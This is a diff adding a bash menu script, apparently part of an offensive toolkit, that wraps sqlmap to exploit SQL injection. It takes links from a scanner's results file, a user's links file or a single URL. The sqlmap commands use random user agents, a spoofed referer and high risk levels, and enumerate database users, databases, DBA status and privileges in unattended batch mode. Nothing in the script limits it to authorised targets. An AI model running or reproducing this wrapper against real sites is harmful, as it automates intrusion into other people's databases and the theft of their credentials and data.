@@ -1,0 +1,134 @@
+#!/bin/bash
+sqli_banner(){
+	echo
+	echo
+	echo
+	echo
+cat <<"EOT"
+  ___|   _ \  |    _) __ __|           |      
+\___ \  |   | |     |    |  _ \   _ \  |  __| 
+      | |   | |     |    | (   | (   | |\__ \ 
+_____/ \__\_\_____|_|   _|\___/ \___/ _|____/ 
+EOT
+}
+
+sqli_core(){
+	echo "Please select which option to use: " | grep --color 'Please select which option to use'
+	select sqli_tool in "Column Counter" "SQLMAP Wrapper" "Return to Main Menu" "Exit"
+	do
+		case $sqli_tool in
+			"Column Counter")
+				source plugins/orderBy
+				wait
+				sqli_banner
+				sqli_core
+			;;
+			"SQLMAP Wrapper")
+				sqlmap_wrapper
+			;;
+			"Return to Main Menu")
+				banner
+				start_engine
+			;;
+			"Exit")
+				echo
+				echo "OK, exiting now..." | grep --color -E 'OK||exiting now'
+				echo
+				exit 0;
+			;;
+		esac
+	done
+}
+
+sqlmap_wrapper(){
+	#Call SQLMAP based on user need (single or list scan) - comment out the question below and just define the path (SPATH) if you dont want to be asked everytime you run it :)
+	echo "Welcome to the SQLMAP wrapper" | grep --color 'Welcome to the SQLMAP wrapper'
+	if [ -z "$SPATH" ]; then
+		echo
+		echo "Please provide the path to SQLMAP: " | grep --color 'Please provide the path to SQLMAP'
+		read SQLMAPPATH
+		SPATH="$SQLMAPPATH"
+	fi
+	if [ ! -e "$SPATH/sqlmap.py" ]; then
+		echo
+		echo "Can't find sqlmap :("
+		sqli_banner
+		sqli_core	
+	fi
+	echo
+	echo "Please select which option you want to use: " | grep --color 'Please select which option you want to use'
+	select sqlmap_wrapper in "Scan SQLi.results File" "Scan My Links File" "Scan Single Link" "Return to Main Menu" "Exit"
+	do
+		case $sqlmap_wrapper in
+			"Scan SQLi.results File")
+				echo
+				if [ ! -r results/SQLi.results ]; then
+					echo "Can't read results/SQLi.results file! Please check and make sure it exists or check permissions and re-run...." | grep --color -E 'Can||t read results||SQLi||results file||Please check and make sure it exists or check permissions and re||run'
+					lfi_core
+				else
+					echo "Ok, hang tight just a sec...." | grep --color -E 'Ok||hang tight just a sec'
+					echo
+					trapper=1
+					cat results/SQLi.results | sed 's/\[ SQL VULN FOUND \]//' | cut -d' ' -f2 | sed 's/%27//' > "$STORAGE1"
+					python $SPATH/sqlmap.py -m $STORAGE1 --random-agent --referer="http://google.com?q=fuckGoogle" --retries=1 -o --technique="BEUS" --union-char="BinGoo" -b --current-user --users --current-db --dbs --is-dba --privileges --batch --beep
+					trapper=0
+				fi
+				rm -rf "$STORAGE1" 2> /dev/null
+				sqli_banner
+				sqli_core
+			;;
+			"Scan My Links File")
+				echo
+				echo "OK, please provide path to links file to analyze for SQLi: " | grep --color -E 'OK||please provide path to links file to analyze for SQLi'
+				read SQLMAPLINKS
+				echo
+				if [ ! -r "$SQLMAPLINKS" ]; then
+					echo "Can't read provided file, please try another file or check permissions..." | grep --color -E 'Can||t read provided file||please try another file or check permissions'
+					echo
+					sqli_banner
+					sqli_core
+				else
+					echo "Starting scan, be patient this will take a sec..." | grep --color -E 'Starting scan||be patient this will take a sec'
+					trapper=1
+					python $SPATH/sqlmap.py -m $SQLMAPLINKS --random-agent --referer="http://google.com?q=fuckGoogle" --retries=1 -o --technique="BEUS" --union-char="BinGoo" -b --current-user --users --current-db --dbs --is-dba --privileges --batch --beep
+					trapper=0
+				fi
+				sqli_banner
+				sqli_core
+			;;
+			"Scan Single Link")
+				echo
+				echo "Please provide site link to test for SQLi: " | grep --color 'Please provide site link to test for SQLi'
+				read SQLMAPSNGL
+				echo
+				echo "Thanks, here we go..." | grep --color -E 'Thanks||here we go'
+				echo
+				python $SPATH/sqlmap.py -u $SQLMAPSNGL --batch --random-agent --referer="http://google.com?q=fuckGoogle" --union-char="BinGoo"  --no-cast --level 3 --risk 3 -o -b --current-user --users --current-db --dbs --is-dba --privileges
+				sqli_banner
+				sqli_core
+			;;
+			"Return to Main Menu")
+				banner
+				start_engine
+			;;
+			"Exit")
+				echo
+				echo "OK, exiting now..." | grep --color -E 'OK||exiting now'
+				echo
+				exit 0;
+			;;
+		esac
+	done
+}
+
+
+# MAIN......................................
+sqli_banner | grep "
+  ___|   _ \  |    _) __ __|           |      
+\___ \  |   | |     |    |  _ \   _ \  |  __| 
+      | |   | |     |    | (   | (   | |\__ \ 
+_____/ \__\_\_____|_|   _|\___/ \___/ _|____/
+"
+sqli_core
+
+#EOF
